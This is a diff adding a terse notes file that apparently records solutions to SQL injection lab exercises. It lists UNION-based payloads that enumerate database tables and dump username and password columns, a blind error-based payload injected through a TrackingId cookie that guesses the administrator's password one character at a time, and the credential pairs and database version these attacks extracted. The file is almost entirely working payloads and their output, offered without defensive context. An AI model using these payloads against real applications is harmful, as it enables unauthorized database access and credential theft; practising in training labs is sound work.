@@ -1,0 +1,30 @@
+administrator - z0j06nbngz9bbdc5o71v
+carlos - 01g9odzdl5pnu255xksy
+weiner - wsq8ix2dq0zzccxzaztt
+
+PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit
+
+administrator - v5sedwkmb52s7h7f8qh3
+wiener - brbmusuws7gi5ubv1myj
+carlos - a1yq2334bcr15bmx2sg3
+
+
++union+select+table_name,+null+from+information_schema.tables--
+users_bfdcfk
+'+union+select+username_ypnwff,+password_fpmwzc+from+users_bfdcfk--
+
+USERS_ELDHDP
+USERNAME_MSMDIG
+PASSWORD_JZFUUH
+
+administrator - um52k62wxg7uihsqr1ry
+carlos - 14uei8f2sc6kjvrxoowt
+wiener - dywgv1hzwczy5l0suvak
+
+password - 87ol4fzhsvaggo2rng45
+password - 870l4fzhsvaggo2rng45
+
+password - n0ikbl69da774bhp728m
+
+#Manual - TrackingId=wOCpInBW8Ef01bzu
+# ' || (select case when (1=1) then to_char(1/0) else '' end from users where username = 'administrator' and substr(password,21,1)='a') || '--
